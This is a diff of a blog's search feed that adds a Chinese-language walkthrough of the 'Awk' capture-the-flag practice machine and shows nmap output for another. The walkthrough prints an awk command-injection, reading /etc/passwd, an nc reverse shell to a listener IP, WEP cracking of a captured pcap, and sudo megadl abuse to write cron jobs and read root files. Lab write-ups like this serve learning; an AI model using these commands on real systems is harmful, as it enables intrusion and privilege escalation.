@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>Awk靶机复盘</title>
+    <link href="/2025/05/21/Awk%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/"/>
+    <url>/2025/05/21/Awk%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/</url>
+    
+    <content type="html"><![CDATA[<h2 id="一-端口扫描："><a href="#一-端口扫描：" class="headerlink" title="一.端口扫描："></a>一.端口扫描：</h2><p><img src="https://kcide.asia/PicGo/20250521160525036.png"></p><h2 id="二-目录扫描："><a href="#二-目录扫描：" class="headerlink" title="二.目录扫描："></a>二.目录扫描：</h2><p><img src="https://kcide.asia/PicGo/20250521160602034.png"></p><h2 id="三-漏洞测试与利用："><a href="#三-漏洞测试与利用：" class="headerlink" title="三.漏洞测试与利用："></a>三.漏洞测试与利用：</h2><p>Web的index.php页面：是一个php的信息页面。</p><p><img src="https://kcide.asia/PicGo/20250521160525036.png"></p><p>访问learning.php页面，进行漏洞测试：</p><p><img src="https://kcide.asia/PicGo/20250521160629875.png"></p><p>awk指令可以执行系统命令：awk ‘BEGIN {system(“ls”)}’</p><p><img src="https://kcide.asia/PicGo/20250521160639472.png"></p><p>awk指令也可以读文件：awk ‘&#x2F;&#x2F;‘ “&#x2F;etc&#x2F;passwd”</p><p><img src="https://kcide.asia/PicGo/20250521160648234.png"></p><p>使用执行系统命令的方式，反弹一下shell</p><blockquote><p>awk ‘BEGIN {system(“rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.226.222 4444 &gt;&#x2F;tmp&#x2F;f”)}’</p></blockquote><p><img src="https://kcide.asia/PicGo/20250521160656026.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">稳定shell：</p><blockquote><p>python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’<br> curl + z<br> stty raw -echo;fg<br> reset<br> xterm</p></blockquote><h2 id="四-提权"><a href="#四-提权" class="headerlink" title="四.提权:"></a>四.提权:</h2><p>进入welcome用户目录：发现了一个WEP-capture.pcap的无线网络数据包，还有一个flag，但是现在还没有权限打开。</p><p><img src="https://kcide.asia/PicGo/20250521160715416.png"></p><p>WEP:是在无线网络通信中对数据进行封装和加密的过程802.11<br> 用到了aircrack-ng工具：</p><p>使用nc命令将数据给传过来：</p><blockquote><p>靶机：nc 192.168.226.222 1234 &lt; WEP-capture.pcap</p><p> kali：nc -lvp 1234 &gt; WEP.pcap</p></blockquote><p><img src="https://kcide.asia/PicGo/20250521160725634.png"></p><blockquote><p>aircrack-ng  WEP.pcap</p></blockquote><p><img src="https://kcide.asia/PicGo/20250521160733244.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">获取到了welcome的密码su welcome进行切换用户，sudo -l查看一下，看到了可利用点<img src="https://kcide.asia/PicGo/20250521160759540.png"></p><p>megadl命令：<br>   写入文件：<br>   sudo megadl <a href="https://mega.nz网址的链接(只能是这个网址,外网)/">https://mega.nz网址的链接（只能是这个网址，外网）</a> –proxy&#x3D;外网代理地址   –path&#x3D;&#x2F;etc&#x2F;cron.d&#x2F;a                注意：path是计划任务的路径，也可以写别的。<br>   读取文件：<br>   sudo megadl –config&#x3D;&#x2F;root&#x2F;root.txt<br>   sudo megadl –config&#x3D;&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p><p>获取了flag：<img src="https://kcide.asia/PicGo/20250521160811088.png"></p><p>编辑获取到了root的密码：</p><p><img src="https://kcide.asia/PicGo/20250521160821843.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Maze-sec靶机系列</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>复盘</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Commit靶机复盘</title>
     <link href="/2025/05/20/Commit%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/"/>
     <url>/2025/05/20/Commit%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/</url>
@@ -11,31 +36,6 @@
     <content type="html"><![CDATA[<h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h5 id="1-1端口扫描："><a href="#1-1端口扫描：" class="headerlink" title="1.1端口扫描："></a>1.1端口扫描：</h5><blockquote><p>┌──(root㉿kali)-[~]<br>└─# nmap -sV -sS -A -p- 192.168.215.111<br>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-05-20 03:44 EDT<br>Nmap scan report for 192.168.215.111<br>Host is up (0.00066s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>80&#x2F;tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache&#x2F;2.4.62 (Debian)<br>|<em>http-title: DevSecOps Platform v3.0<br>2222&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey:<br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|</em>  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>MAC Address: 08:00:27:34:3B:D1 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)<br>Device type: general purpose|router<br>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X<br>OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3<br>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p><p>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.66 ms 192.168.215.111</p><p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 36.10 seconds</p></blockquote><h5 id="1-2-目录扫描："><a href="#1-2-目录扫描：" class="headerlink" title="1.2 目录扫描："></a>1.2 目录扫描：</h5><p><img src="/./images/Snipaste_2025-05-20_16-50-09.png" class="lazyload" data-srcset="/./images/Snipaste_2025-05-20_16-50-09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Snipaste_2025-05-20_16-50-09"></p><p><img src="http://kcide.asia/bejing.jpg" class="lazyload" data-srcset="http://kcide.asia/bejing.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>]]></content>
     
     
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>我的第一篇文章</title>
-    <link href="/2025/05/19/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
-    <url>/2025/05/19/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-    
-    <categories>
-      
-      <category>分类1</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>标签1</tag>
-      
-    </tags>
     
   </entry>
   
